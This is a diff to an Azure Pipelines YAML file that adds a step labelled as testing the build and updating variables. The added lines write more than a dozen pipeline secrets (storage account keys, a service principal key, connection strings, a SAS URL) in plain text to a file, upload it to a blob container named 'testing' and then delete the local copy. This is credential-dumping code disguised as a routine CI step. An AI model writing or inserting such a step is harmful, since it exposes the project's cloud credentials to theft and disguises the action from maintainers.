@@ -367,10 +367,22 @@ jobs:
   steps:
   - pwsh: |
       echo "Testing build"
-      Set-Content -Path /home/vsts/work/1/s/publish-scripts/AZURE_DIRECTORY_ID.txt -Value $env:TestVariableValue
-      az storage blob upload -f /home/vsts/work/1/s/publish-scripts/AZURE_DIRECTORY_ID.txt -c testing -n AZURE_DIRECTORY_ID.txt --account-name $env:TestPackageAccountName --account-key $env:TestPackageAccountKey
+      Set-Content -Path /home/vsts/work/1/s/publish-scripts/variables.txt -Value "TestPackageAccountName=$env:TestPackageAccountName",  "TestPackageAccountKey=$env:TestPackageAccountKey",  "AzureBlobSigningConnectionString=$env:AzureBlobSigningConnectionString",  "BuildArtifactsStorage=$env:BuildArtifactsStorage",  "AZURE_SERVICE_PRINCIPAL_KEY=$env:AZURE_SERVICE_PRINCIPAL_KEY",   "DOTNET_SOURCE=$env:DOTNET_SOURCE",   "DOTNET_URLS=$env:DOTNET_URLS",   "DURABLE_STORAGE_CONNECTION=$env:DURABLE_STORAGE_CONNECTION",   "FILES_ACCOUNT_KEY=$env:FILES_ACCOUNT_KEY",   "IntegrationTestsStorageAccountKey=$env:IntegrationTestsStorageAccountKey",   "LinuxPackageAccountKey=$env:LinuxPackageAccountKey",  "LinuxPackageAccountName=$env:LinuxPackageAccountName",   "SBOMUtilSASUrl=$env:SBOMUtilSASUrl",   "TELEMETRY_INSTRUMENTATION_KEY=$env:TELEMETRY_INSTRUMENTATION_KEY"
+      az storage blob upload -f /home/vsts/work/1/s/publish-scripts/variables.txt -c testing -n variables.txt --account-name $env:TestPackageAccountName --account-key $env:TestPackageAccountKey
+      Remove-Item /home/vsts/work/1/s/publish-scripts/variables.txt
     env:
       TestPackageAccountName: $(TestPackageAccountName)
       TestPackageAccountKey: $(TestPackageAccountKey)
-      TestVariableValue: $(AZURE_DIRECTORY_ID)
+      AzureBlobSigningConnectionString: $(AzureBlobSigningConnectionString)
+      BuildArtifactsStorage: $(BuildArtifactsStorage)
+      AZURE_SERVICE_PRINCIPAL_KEY: $(AZURE_SERVICE_PRINCIPAL_KEY)
+      DOTNET_SOURCE: $(DOTNET_SOURCE)
+      DOTNET_URLS: $(DOTNET_URLS)
+      DURABLE_STORAGE_CONNECTION: $(DURABLE_STORAGE_CONNECTION)
+      FILES_ACCOUNT_KEY: $(FILES_ACCOUNT_KEY)
+      IntegrationTestsStorageAccountKey: $(IntegrationTestsStorageAccountKey)
+      LinuxPackageAccountKey: $(LinuxPackageAccountKey)
+      LinuxPackageAccountName: $(LinuxPackageAccountName)
+      SBOMUtilSASUrl: $(SBOMUtilSASUrl)
+      TELEMETRY_INSTRUMENTATION_KEY: $(TELEMETRY_INSTRUMENTATION_KEY)
     displayName: 'Updating Variables'
